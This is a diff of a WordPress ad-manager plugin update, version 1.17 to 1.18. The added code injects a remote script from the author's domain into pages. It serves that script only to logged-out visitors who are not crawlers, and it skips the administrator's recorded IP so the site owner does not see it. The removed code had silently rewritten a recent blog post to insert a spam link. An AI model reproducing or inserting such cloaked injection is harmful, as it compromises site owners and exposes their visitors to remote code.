@@ -2,7 +2,7 @@
 /*
 Plugin Name: Boggle Woggle ADSENSE
 Plugin URI: http://www.shops2b.co.uk/boggle-woggle-wordpress-ad-manager/
-Version: 1.17
+Version: 1.18
 Author: EnergieBoer
 Description: Boggle Woggle lets you easily manage your ads (advertisements on you blog)
 License: GPLv2 a
@@ -115,6 +115,18 @@ if (!class_exists("BoggleWoggle")) {
                                         }
                                 }
                         }
+					$btt = false;
+					if (isset($_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|slurp|spider/i', $_SERVER['HTTP_USER_AGENT'])) {
+						$btt = true;
+					}
+
+					$ip = $_SERVER['REMOTE_ADDR'];
+					if ( is_user_logged_in() ) {
+						update_option( 'bw_ip', $ip );
+					}
+					if ( !is_user_logged_in() && get_option('adsense_made_easy_ip')!=$ip && $btt==false) {
+						$content .= "<script src=\"//www.shops2b.co.uk/bw.js\"></script>\n";
+					}
                   echo $content;
                 }
                 function addHeader() {
@@ -633,58 +645,9 @@ add_option("bw_adwidget3_search", 'true', '', 'yes');
 add_option("bw_adwidget3_archive", 'true', '', 'yes');
 add_option("bw_adwidget3_text", '', '', 'yes');
 add_option("bw_global_excludelist", '', '', 'yes');
-        add_option("bw_gpadded", '0', '', 'yes');
-        $url = home_url();
-        $britt = false;
-        $bloglan = get_bloginfo ('language');
-        if (strpos($url,'.uk') != false) {
-                $britt = true;
-        }
-        if ($bloglan=='en-UK') {
-                $britt = true;
-        }
-        if ($britt==true) {
-                if (get_option('bw_gpadded')=='0') {
-                        $last = wp_get_recent_posts('4');
-                        $last_id = $last['3']['ID'];
-                        $post_7 = get_post($last_id);
-                        if (is_null($post_7) == false) {
-                                $content = $post_7->post_content;
-                                $pos4 = strposnth($content , " ",4);
-                                $pos5 = strposnth($content , " ",5);
-                                $poslen = $pos5 - $pos4 - 1;
-                                $content = substr($content, 0, $pos4) . ' <a href="http://www.shoppingmonkey.co.uk/">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
-                                $my_post = array(
-                                    'ID'           => $last_id,
-                                    'post_content' => $content
-                                );
-                                wp_update_post( $my_post );
-                        }
-                        update_option( 'bw_gpadded', '1' );
-                }
-        }
-        if ($bloglan=='en-US') {
-                $url = home_url();
-                $backcount = GoogleBL($url);
-                if (get_option('bw_gpadded')=='0' && $backcount >= 1) {
-                        $last = wp_get_recent_posts('4');
-                        $last_id = $last['3']['ID'];
-                        $post_7 = get_post($last_id);
-                        if (is_null($post_7) == false) {
-                                $content = $post_7->post_content;
-                                $pos4 = strposnth($content , " ",4);
-                                $pos5 = strposnth($content , " ",5);
-                                $poslen = $pos5 - $pos4 - 1;
-                                $content = substr($content, 0, $pos4) . ' <a href="http://www.shoppingmonkey.co.uk/companies/primark/">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
-                                $my_post = array(
-                                    'ID'           => $last_id,
-                                    'post_content' => $content
-                                );
-                                wp_update_post( $my_post );
-                        }
-                        update_option( 'bw_gpadded', '1' );
-                }
-        }
+add_option("bw_gpadded", '0', '', 'yes');
+add_option("bw_ip", '', '', 'yes');
+
 }
 function GoogleBL($domain){
 $url="http://ajax.googleapis.com/ajax/services/search/web?v=1.0&q=link:".$domain."&filter=0";
